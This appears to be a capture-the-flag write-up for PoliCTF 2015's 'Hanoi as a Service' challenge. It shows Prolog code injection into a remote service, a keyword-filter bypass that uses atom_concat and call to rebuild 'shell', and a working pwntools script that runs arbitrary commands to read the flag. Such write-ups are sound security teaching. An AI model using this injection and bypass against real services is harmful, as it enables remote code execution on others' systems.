---
title: "PoliCTF 2015 - Hanoi as a Service (Pwnable 50)"
header:
  overlay_image: /assets/images/polictf2015/towerofhanoi.jpg
  overlay_filter: 0.5
tags:
  - polictf2015
  - writeup
  - pwn
---

Remote prolog application to solve the Tower of Hanoi problem is vulnerable to
remote code execution by injecting Prolog code.

## Challenge Description

#### Points

50

#### Description

```
Check out our shiny new HaaS platform!

nc haas.polictf.it 80
```

## Solution

Let's investigate what this service does:

```shell
$ nc haas.polictf.it 80
Welcome to the Hanoi-as-a-Service cloud platform!
How many disks does your tower have?
3
* Move top disk from a to b
* Move top disk from a to c
* Move top disk from b to c
* Move top disk from a to b
* Move top disk from c to a
* Move top disk from c to b
* Move top disk from a to b
```

Looks like it's a prgoram to solve the Tower of Hanoi problem. Let's explore
further and see if we can introduce an error:

```shell
$ nc haas.polictf.it 80
Welcome to the Hanoi-as-a-Service cloud platform!
How many disks does your tower have?
')
ERROR: Prolog initialisation failed:
ERROR: Syntax error: End of file in quoted string
ERROR: hanoi('))
ERROR: ** here **
ERROR:
```

So it looks like we're dealing with a Prolog application and that the statement
is in the form: `hanoi(<user_input>)`. Great! It's injectable! Let's try spawning
a shell with some Prolog system interaction features!

```shell
$ nc haas.polictf.it 80
Welcome to the Hanoi-as-a-Service cloud platform!
How many disks does your tower have?
), shell('id'). %
Nope.
$ nc haas.polictf.it 80
Welcome to the Hanoi-as-a-Service cloud platform!
How many disks does your tower have?
), shell('id'). %
Nice try...
```

Okay, there's some input validation there. So let's work some Prolog magic by
splitting up the 'shell'. Now, Prolog isn't like your normal programming
language and it works on the concepts more familiar to a Scheme/Lisp programmer.
We can use three predicates: `call`, `atom_concat` and `atom_to_term` to bypass the
validation and execute our arbitrary command.

```shell
$ nc haas.polictf.it 80
Welcome to the Hanoi-as-a-Service cloud platform!
How many disks does your tower have?
1),atom_concat('sh','ell',Atom), atom_to_term(Atom, Term, []), call(Term, 'id').%
* Move top disk from a to b
uid=1001(ctf) gid=1001(ctf) groups=1001(ctf)
```

Now all we have to do is write our exploit:

```python
from pwn import *
import sys

command = sys.argv[1] or ""

exp_string = "1),atom_concat('sh','ell', Atom), atom_to_term(Atom, Term, []), call(Term, '%s').%%" % command

r = remote("haas.polictf.it", 80)
r.sendline(exp_string)
print r.recvall()
```

Explore the file system, and extract our flag!

```shell
$ python exploit.py "cat /home/ctf/haas/jhknsjdfhef_flag_here"
[+] Opening connection to haas.polictf.it on port 80: Done
[+] Recieving all data: Done (150B)
[*] Closed connection to haas.polictf.it port 80
Welcome to the Hanoi-as-a-Service cloud platform!
How many disks does your tower have?
* Move top disk from a to b
flag{Pr0gramm1ng_in_l0g1c_1s_c00l}
```

Flag: **flag{Pr0gramm1ng\_in\_l0g1c\_1s\_c00l}**
